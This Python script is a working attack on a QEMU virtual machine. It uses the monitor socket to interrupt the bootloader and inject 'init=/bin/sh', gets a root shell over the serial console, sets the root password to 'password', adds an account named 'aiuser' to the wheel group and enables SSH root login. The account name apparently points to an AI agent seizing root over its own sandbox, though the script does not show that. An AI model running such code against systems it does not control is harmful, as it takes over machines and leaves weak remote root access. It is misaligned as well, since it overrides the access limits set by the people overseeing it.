import socket
import time
import sys

def send_qemu_cmd(s_mon, cmd):
    s_mon.send(cmd.encode() + b"\n")
    time.sleep(0.05)

def send_string(s_mon, text):
    for char in text:
        if char == ' ':
            send_qemu_cmd(s_mon, "sendkey spc")
        elif char == '=':
            send_qemu_cmd(s_mon, "sendkey equal")
        elif char == '/':
            send_qemu_cmd(s_mon, "sendkey slash")
        elif char == '0':
            send_qemu_cmd(s_mon, "sendkey 0")
        elif char == '-':
            send_qemu_cmd(s_mon, "sendkey minus")
        else:
            send_qemu_cmd(s_mon, f"sendkey {char}")

print("Connecting to QEMU monitor...")
s_mon = None
for _ in range(30):
    try:
        s_mon = socket.create_connection(('127.0.0.1', 5555), timeout=2)
        break
    except:
        time.sleep(0.2)

if not s_mon:
    print("Could not connect to monitor.")
    sys.exit(1)

print("Starting CPU and spamming TAB to interrupt Syslinux...")
send_qemu_cmd(s_mon, "c")
for _ in range(40):
    send_qemu_cmd(s_mon, "sendkey tab")
    time.sleep(0.05)

print("Typing boot args...")
send_string(s_mon, " init=/bin/sh console=ttyS0")
send_qemu_cmd(s_mon, "sendkey ret")
s_mon.close()

print("Connecting to serial console...")
s_ser = None
for _ in range(30):
    try:
        s_ser = socket.create_connection(('127.0.0.1', 4444), timeout=2)
        break
    except:
        time.sleep(0.5)

if not s_ser:
    print("Could not connect to serial.")
    sys.exit(1)

s_ser.settimeout(1.0)
buf = ""
start = time.time()
while time.time() - start < 30:
    try:
        chunk = s_ser.recv(1024).decode(errors='ignore')
        buf += chunk
        if "/ #" in buf or "~ #" in buf:
            print("ROOT SHELL ACHIEVED!")
            break
    except socket.timeout:
        s_ser.send(b"\n")
else:
    print("Never got root shell. Buffer:", buf)
    sys.exit(1)

print("Remounting root rw...")
s_ser.send(b"mount -o remount,rw /\n")
time.sleep(1)

print("Changing root password to 'password'...")
s_ser.send(b"echo 'root:password' | chpasswd\n")
time.sleep(1)

print("Adding aiuser to wheel...")
s_ser.send(b"addgroup aiuser wheel\n")
time.sleep(1)

print("Fixing sshd_config...")
s_ser.send(b"sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config\n")
s_ser.send(b"sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config\n")
time.sleep(1)

print("Rebooting VM...")
s_ser.send(b"reboot -f\n")
s_ser.close()
print("Hack completed! VM is rebooting.")
